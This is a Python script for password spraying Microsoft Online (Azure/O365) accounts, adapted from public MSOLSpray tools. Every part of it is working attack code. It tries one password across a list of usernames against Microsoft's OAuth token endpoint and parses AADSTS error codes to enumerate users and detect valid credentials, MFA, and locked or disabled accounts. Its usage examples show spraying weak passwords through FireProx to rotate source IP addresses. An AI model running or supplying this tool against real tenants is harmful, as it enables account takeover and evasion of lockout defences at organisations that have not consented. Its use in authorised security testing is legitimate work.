#! /usr/bin/env python3

#
# Requires Python 3.7+ & aiohttp (speedups recommended)
# pip3 install aiohttp[speedups]
#

import sys
import asyncio
import aiohttp
import logging
import pathlib
import contextvars
import argparse

description = """
This is a combination of MartinIngesen's MSOLSpray (https://github.com/MartinIngesen/MSOLSpray) and byt3bl33d3r's threaded port (https://gist.github.com/byt3bl33d3r/19a48fff8fdc34cc1dd1f1d2807e1b7f) coincidently this is all original work of DaftHack(https://github.com/dafthack/MSOLSpray). I barely modified much of anything so all credit goes to them. 
This script will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
"""

epilog = """
EXAMPLE USAGE:
This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 msol_spray.py --userlist ./userlist.txt --password Winter2020
This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
    python3 msol_spray.py --userlist ./userlist.txt --password P@ssword --url https://api-gateway-endpoint-id.execute-api.us-east-1.amazonaws.com/fireprox
"""

parser = argparse.ArgumentParser(
    description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)

parser.add_argument("-u", "--userlist", metavar="FILE",
                    required=True, help="File filled with usernames one-per-line")
parser.add_argument("-d", "--domain", required=True,
                    help="The domain excluding the @ sign (example.com)")
parser.add_argument("-p", "--password", required=True,
                    help="A single password that will be used to perform the password spray. (Required)")
parser.add_argument("-t", "--threads", default="25",
                    help="The number of threads to run. Default is 25")
parser.add_argument("-o", "--outfile", default="enumed_users.lst",
                    help="Outputs enumerated users to file you specify.")
parser.add_argument("--url", default="https://login.microsoft.com",
                    help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
args = parser.parse_args()

user_list = args.userlist
pass_word = args.password
domain = args.domain
url = args.url
threads = int(args.threads)
outfile = open(args.outfile, "w")
print('-' * 50)

handler = logging.StreamHandler()
handler.setFormatter(
    logging.Formatter("[%(levelname)s] %(message)s")
)

log = logging.getLogger("msolspray")
log.setLevel(logging.DEBUG)
log.addHandler(handler)

task_username = contextvars.ContextVar('username')

old_factory = logging.getLogRecordFactory()


def new_factory(*args, **kwargs):
    record = old_factory(*args, **kwargs)
    username = task_username.get(None)
    if username:
        record.msg = f"{username:<1} - {record.msg}"
    return record


logging.setLogRecordFactory(new_factory)


async def spray(session: aiohttp.ClientSession, sem: asyncio.BoundedSemaphore, username: str, password: str) -> None:
    async with sem:
        task_username.set(username)

        data = {
            'resource': 'https://graph.windows.net',
            'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
            'client_info': '1',
            'grant_type': 'password',
            'username': username + '@' + domain,
            'password': password,
            'scope': 'openid'
        }

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded'
        }

        async with session.post(url + '/common/oauth2/token', headers=headers, data=data) as r:
            if r.status == 200:
                log.debug(f"Found valid account {username} / {password}.")
                return
            else:
                msg = await r.json()

                error = msg['error_description'].split('\r\n')[0]

                if "AADSTS50126" in error:
                    log.debug("Enumerated User/Invalid password.")
                    outfile.write(username + '@' + domain + '\n')
                elif "AADSTS50128" in error or "AADSTS50059" in error:
                    log.debug(
                        "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
                elif "AADSTS50034" in error:
                    pass
                    #log.debug("The user doesn't exist.")
                elif "AADSTS50079" in error or "AADSTS50076" in error:
                    log.debug(
                        "Credential valid however the response indicates MFA (Microsoft) is in use.")
                elif "AADSTS50158" in error:
                    log.debug(
                        "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use.")
                elif "AADSTS50053" in error:
                    log.debug("The account appears to be locked.")
                elif "AADSTS50057" in error:
                    log.debug("The account appears to be disabled.")
                elif "AADSTS50055" in error:
                    log.debug(
                        "Credential valid however the user's password is expired.")
                else:
                    log.debug(f"Got unknown error: {error}")


async def username_generator(usernames: str):
    path = pathlib.Path(usernames)
    if path.exists():
        usernames = open(path.expanduser())

    try:
        for user in usernames:
            yield user.rstrip('\n')
    finally:
        if path.exists():
            usernames.close()


async def main(usernames: str, password: str, threads: int) -> None:
    connector = aiohttp.TCPConnector(ssl=False)
    async with aiohttp.ClientSession(
        connector=connector,
        cookie_jar=aiohttp.DummyCookieJar(),
        trust_env=True
    ) as session:
        sem = asyncio.BoundedSemaphore(value=threads)
        tasks = [asyncio.create_task(spray(session, sem, user, password)) async for user in username_generator(usernames)]
        await asyncio.gather(*tasks)

if __name__ == '__main__':

    asyncio.run(
        main(
            user_list,
            pass_word,
            threads
        )
    )
print('-' * 50)
print('Wrote enumerated users to: ./' + args.outfile)

outfile.close()
